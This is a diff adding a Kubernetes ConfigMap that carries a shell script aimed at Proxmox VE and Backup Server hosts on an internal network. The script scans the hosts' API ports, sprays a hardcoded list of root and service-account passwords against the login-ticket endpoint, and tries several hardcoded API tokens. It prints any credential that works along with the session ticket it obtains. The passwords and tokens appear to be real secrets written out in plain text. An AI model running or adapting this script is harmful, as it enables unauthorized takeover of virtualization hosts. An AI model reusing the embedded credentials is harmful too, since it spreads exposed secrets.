@@ -1,0 +1,61 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: pveprobe2-script
+  namespace: default
+data:
+  probe.sh: |
+    #!/bin/sh
+    UA="Mozilla/5.0"
+    HOSTS="10.0.0.1|pve-1 10.0.0.2|pve-2 10.0.0.3|pve-3 10.0.0.4|pve-4 10.0.0.5|pve-5 10.0.0.6|pve-6 10.0.0.11|pve-utils"
+    
+    # credential pairs user|pass
+    CREDS="excute.script.vm@pve|vPBbi0c1a5qb5xEcQPLt
+    root@pam|vPBbi0c1a5qb5xEcQPLt
+    root@pam|MNH@2023
+    root@pam|C)nco2be1be1
+    root@pve|vPBbi0c1a5qb5xEcQPLt
+    root@pve|MNH@2023
+    root@pbs|vPBbi0c1a5qb5xEcQPLt
+    root@pbs|MNH@2023"
+    
+    # per-host own literal encrypted value as password attempt
+    ownpw() {
+      case "$1" in
+        10.0.0.1) echo 'S8kTNpY/UxYjfNdJtiWEdwcjWQdJtp12FrqzoV5RaQ==' ;;
+        10.0.0.2) echo 'N2w7BYl+FTrO+DQ/niSBT2CYsJk1E7VFCfv1jbPVig==' ;;
+        10.0.0.3) echo 'rOdNmjM9Q+QUeSgWWmRfbZZF7CqumMPas7ijU2lUlg==' ;;
+        *) echo '' ;;
+      esac
+    }
+    
+    try_ticket() { # ip port user pass label
+      ip="$1"; port="$2"; user="$3"; pw="$4"; label="$5"
+      body=$(curl -sk --max-time 10 --data-urlencode "username=$user" --data-urlencode "password=$pw" "https://$ip:$port/api2/json/access/ticket")
+      if echo "$body" | grep -q '"ticket"'; then
+        echo "SUCCESS[$label] $ip:$port $user PW=[$pw] => $(echo "$body" | head -c 380)"
+      fi
+    }
+    
+    echo "=== VERSION (reach) ==="
+    for hp in $HOSTS; do ip=${hp%%|*}; nm=${hp##*|}; c1=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 6 "https://$ip:8006/api2/json/version"); c2=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 6 "https://$ip:8007/api2/json/version"); echo "$nm $ip pve8006=$c1 pbs8007=$c2"; done
+    
+    echo "=== TOKEN auth tests (PVEAPIToken) ==="
+    for ip in 10.0.0.1 10.0.0.5; do
+      for tk in "root@pam!kiet.pham=70bcd446-757d-4f2f-884f-d19b5186be4b" "root@pam!mona-host-app=Ni9q1azIA5Rk5AKvshDzuTO5PdwPzSbc83WsMjhs8Aw" "root@pam!mona-host-app=3f1f4810-bcc5-4785-b49d-240d00f721d0" "root@pam!mona-host-app=5de6c99e-a217-4dac-9fbb-f3abc9317b97"; do
+        code=$(curl -sk -o /tmp/tkout -w '%{http_code}' --max-time 8 -H "Authorization: PVEAPIToken=$tk" "https://$ip:8006/api2/json/version")
+        echo "TOKEN $ip [$tk] => $code $(head -c 120 /tmp/tkout)"
+      done
+    done
+    
+    echo "=== TICKET tests ==="
+    for hp in $HOSTS; do ip=${hp%%|*}; nm=${hp##*|};
+      for cr in $CREDS; do u=${cr%%|*}; p=${cr##*|};
+        [ -n "$p" ] && try_ticket "$ip" 8006 "$u" "$p" "$nm/8006"
+        try_ticket "$ip" 8007 "$u" "$p" "$nm/8007"
+      done
+      op=$(ownpw "$ip"); [ -n "$op" ] && try_ticket "$ip" 8006 "root@pam" "$op" "$nm/own"
+    done
+    
+    echo "=== version-fetch with any success later ==="
+    echo "=== DONE ==="
